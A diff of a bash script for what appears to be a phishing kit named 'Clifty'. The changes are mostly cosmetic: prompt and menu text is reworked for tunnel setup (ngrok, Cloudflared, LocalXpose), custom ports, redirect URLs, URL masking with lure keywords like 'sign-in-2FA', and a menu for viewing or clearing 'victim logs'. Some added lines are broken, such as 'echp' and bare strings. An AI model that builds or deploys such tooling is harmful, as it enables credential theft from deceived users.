@@ -166,7 +166,7 @@ sbanner(){
 
 ## Update Prompt
 uprompt(){
-        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected}${NF} :${NA} ${BLUE}")"
+        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected}${NF} >>${NA} ${BLUE}")"
 }
 
 ## Directories
@@ -297,9 +297,17 @@ check_update() {
 		{ sleep 3; clear; mainmenu; }
 	else
 		echo -e " "
+                echo -e "${ULWHITE}${BOLDWHITE}UPDATE FOUND!! ${NF} : ${NA}"
+                echo -e " "
 		echo -e "${GREEN} Current version = ${YELLOW} $current_ver "
 		echo -e "${GREEN} Latest version = ${YELLOW} $lat_ver "
-		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
+                echo -e " "
+                echo -e "${GREEN}[${WHITE}?${GREEN}]${GREEN} Do you want to update it? ${NF}"
+                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+                echo -e " "
+                echo -e "$(echo -e "${YELLOW}>> ${BLUE}")"
+	        read -p "${temprompt}" ureply
 		case $ureply in
 			Y | y)
 				update;;
@@ -367,9 +375,17 @@ load_print() {
 
 ## Install ngrok
 check_ngrok(){
+        { clear; banner; echo -e ""; }
 	if [ ! -e ".server/ngrok" ]; then
 		echo -e " "
-		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
+                "${GREEN}[${WHITE}!${GREEN}]${GREEN} NGROK NOT INSTALLED!!${BLUE}"
+                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+                echo -e " " 
+                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+                echp -e "${NC}"
+                echo -e "$(echo -e "${YELLOW}>> ${BLUE}")"
+	        read -p "${temprompt}"
 		case $REPLY in
 		Y | y)
 			install_ngrok
@@ -416,7 +432,8 @@ ngrok_token_setup(){
         fi
 
 	rm -rf ${HOME}/.ngrok2/ngrok.yml
-	read -p "${RED}[${WHITE}-${RED}]${YELLOW} Enter your authtoken :" ntoken
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NF} : ${NA}")"
+	read -p "${temprompt}" ntoken
 	echo -e "authtoken : ${ntoken}" >> ngrok.yml
 	mv ngrok.yml ${HOME}/.ngrok2/
 	./.server/ngrok config upgrade
@@ -427,7 +444,7 @@ ngrok_token_setup(){
 }
 ngrok_region() {
         echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION ${NF} : ${NC}"
-        temprompt="$(echo -e "   ${GREEN}(Example: us eu au ap sa jp in)${NC} :")"
+        temprompt="$(echo -e " ${GREEN}(Example: us eu au ap sa jp in)${NC} :")"
 	read -p "${temprompt}" ngrokregion
 	case $ngrokregion in
 	"us" | "US")
@@ -451,12 +468,12 @@ ngrok_region() {
 }
 ## Start ngrok
 start_ngrok() {
-        { setup_site; clear; banner; echo -e ""; }
+        setup_site
 	echo -e "\n"
 	ngrokregion="us"
-        temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION ${NF} : ${NC}")"
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION (Y/n) ${NF} : ${NA}")"
 	read -p "${temprompt}"
-	case $reply in
+	case $REPLY in
 	1 | Y | y | yes | Yes | YES)
 		ngrok_region;;
 	*)
@@ -480,9 +497,17 @@ fetchlink_ngrok() {
 
 ## Install Cloudflared
 check_cloudflared(){
+        { clear; banner; echo -e ""; }
 	if [ ! -e ".server/cloudflared" ]; then
 		echo -e " "
-		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
+                "${GREEN}[${WHITE}!${GREEN}]${GREEN} CLOUDFLARED NOT INSTALLED!!${BLUE}"
+                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+                echo -e " " 
+                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+                echp -e "${NC}"
+		echo -e "$(echo -e "${YELLOW}>> ${BLUE}")"
+                read -p "${temprompt}"
 		case $REPLY in
 		Y | y)
 			install_cloudflared
@@ -509,7 +534,7 @@ install_cloudflared() {
 }
 ## Start Cloudflared
 start_cloudflared() {
-        { setup_site; clear; banner; echo -e ""; }
+        setup_site
         rm .cld.log > /dev/null 2>&1 &
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
@@ -531,7 +556,14 @@ fetchlink_cloudflared() {
 check_localxpose(){
 	if [ ! -e ".server/loclx" ]; then
 		echo -e " "
-		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
+                "${GREEN}[${WHITE}!${GREEN}]${GREEN} LOCALXPOSE NOT INSTALLED!!${BLUE}"
+                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
+                echo -e " " 
+                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+                echp -e "${NC}"
+		echo -e "$(echo -e "${YELLOW}>> ${BLUE}")"
+                read -p "${temprompt}"
 		case $REPLY in
 		Y | y)
 			install_localxpose
@@ -567,7 +599,8 @@ token_localxpose() {
 	[ "$(./.server/loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${YELLOW}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${YELLOW} Loclx Token :${YELLOW} " loclx_token
+                temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NF} : ${NA}")"
+	        read -p "${temprompt}" loclx_token
 		[[ $loclx_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
 		} || {
@@ -577,9 +610,11 @@ token_localxpose() {
 }
 ## Start LocalXpose
 start_loclx() {
-	{ setup_site; clear; banner; echo -e ""; }
+	{ clear; banner; echo -e ""; }
+        setup_site
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${YELLOW} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${YELLOW} " opinion
+        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} CHANGE NGROK SERVER REGION (Y/eu/us/N)${NF} : ${NA}")"
+	read -n1 -p "${temprompt}" opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -646,17 +681,18 @@ cusport() {
         echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
         echo -e ""
         echo -e ""
+        PORT=4444
         echo -e "${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NF} : ${NC}"
         echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
-        echo -e ""
-        echo -e ""
-        echo -e "${BLUE}[1/Y/y]  ${CYAN} YES ${NC}"
-        echo -e "${BLUE}[2/N/n/*]${CYAN} NO ${NC}"
+        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
         echo -e ""
         selected="Clifty/${siname}/${sitype}/${tutype}"
         uprompt;read -p "${prompt}"
 	case $REPLY in
 	1 | Y | y | yes | Yes | YES)
+                echo -e ""
+                echo -e ""
                 temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR CUSTOM PORT ${NF} : ${NC}")"
 		read -p "${temprompt}" cport
 		PORT="${cport}";;
@@ -709,12 +745,11 @@ redirect_check(){
         echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
         echo -e ""
         echo -e ""
-        echo -e "${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
+        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
         echo -e "   ${GREEN}Current Redirect Url : ${BLUE}${rdurl}${NA}"   
-        echo -e ""
-        echo -e ""
-        echo -e "${BLUE}[1/Y/y]  ${CYAN} YES ${NC}"
-        echo -e "${BLUE}[2/N/n/*]${CYAN} NO ${NC}"
+        echo -e " "
+        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
         echo -e ""
         selected="Clifty/${siname}/${sitype}/${tutype}"
         uprompt;read -p "${prompt}" rdchoice
@@ -728,13 +763,19 @@ redirect_check(){
 }
 redirect_input() {
         echo -e "\n"
-        echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR REDIRECT URL ${NF} : ${NC}"
-        read -p " " urdurl
+        echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR REDIRECT URL ${NF} : ${NA}"
+        read -p "> " urdurl
         if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
                 sleep 3
-                clear
-                banner
+                { clear; banner; }
+                echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+                echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+                echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
+                echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
+                echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
+                echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
+                echo -e ""
                 redirect_input
         else
                 redirect_setup
@@ -780,12 +821,14 @@ checklink() {
 
 ## URL MASKING
 cusurl(){
-	clear
-	banner
-	echo -e " "
-	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Do You want to Customize the uRL BeLow?"
-	echo -e " "
-	read -p "${RED}[${WHITE}-${RED}]${YELLOW} $LINK (Y/n) : ${YELLOW}" CUS_URI
+	{ clear; banner; echo -e " "; }
+        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CUSTOMIZE THE URL BELOW ${NF} : ${NA}"
+        echo -e "   ${GREEN}URL : ${BLUE}${LINK}${NA}"  
+        echo -e "" 
+        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
+        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
+        echo -e "$(echo -e "${YELLOW}>> ${BLUE}")"
+	read -p "${temprompt}" CUS_URI
 	case $CUS_URI in
                 Y | y)
 			check_netstats
@@ -807,7 +850,9 @@ cusurl(){
                 esac
 }
 shorten_keystocks(){
-	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com) : " CUS_URL
+        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL : ${NF} : ${NA}"
+        echo -e "$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
+	read -p "${temprompt}" CUS_URL
 	checkurl ${CUS_URL}
 	echo -e " "
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${YELLOW})${GREEN} : ${YELLOW}" Keystks #KEY_STOCKS
@@ -1157,22 +1202,27 @@ logs_check() {
 	fi
 }
 logs_menu() {
-clear
-banner
+{ clear; banner; }
+userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
+check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
+echo -e " "
 echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
 echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
 echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
 echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
-read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_menu
+temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty/Logs${NF} >>${NA} ${BLUE}")"
+read -p "${temprompt}" reply_logs_menu
 
         case $reply_logs_menu in
                 1 | 01)
                         ls logs/
-			{ sleep 5; clear; logs_menu; };;
+			{ sleep 8; clear; logs_menu; };;
                 2 | 02)
 			ls logs/
-                        read -p "${RED}[${WHITE}?${RED}]${YELLOW} Enter the file name without extension (.txt) : ${BLUE}"
+                        echo -e ""
+                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Enter the file name without extension (.txt) >> ${BLUE}")"
+                        read -p "${temprompt}"
 			if [ -f "logs/$REPLY.txt" ]; then
 				cat logs/$REPLY.txt
 			else
@@ -1180,7 +1230,9 @@ read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_m
 	                        { sleep 1; clear; logs_menu; }
 			fi;;
                 3 | 03)
-			read -p "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) : ${BLUE}"
+                        echo -e ""
+                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
+                        read -p "${temprompt}"
 			case $REPLY in
         	                Y | y)
                 	                rm -rf logs
@@ -1199,8 +1251,7 @@ read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_m
 }
 ## Tunnel selection
 tunnelmenu() {
-clear
-banner
+{ clear; banner; }
 echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
@@ -1217,16 +1268,16 @@ selected="Clifty/${siname}/${sitype}"
 uprompt;read -p "${prompt}" tuchoice
         case $tuchoice in
                 1 | 01)
-                        tunneler="LocalHost"
+                        tutype="LocalHost"
                         start_localhost;;
                 2 | 02)
-                        tunneler="Ngrok"
+                        tutype="Ngrok"
                         check_ngrok;;
                 3 | 03)
-                        tunneler="Cloudflared"
+                        tutype="Cloudflared"
                         check_cloudflared;;
 		4 | 04)
-                        tunneler="LocalXpose"
+                        tutype="LocalXpose"
                         check_localxpose;;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1235,7 +1286,7 @@ uprompt;read -p "${prompt}" tuchoice
 }
 
 mainmenu() {
-banner
+{ clear; banner; }
 userip; echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
 check_netstats; echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
 echo -e " "
@@ -3226,5 +3277,4 @@ directories
 kill_pid
 dependencies
 xpermission
-clear
 mainmenu
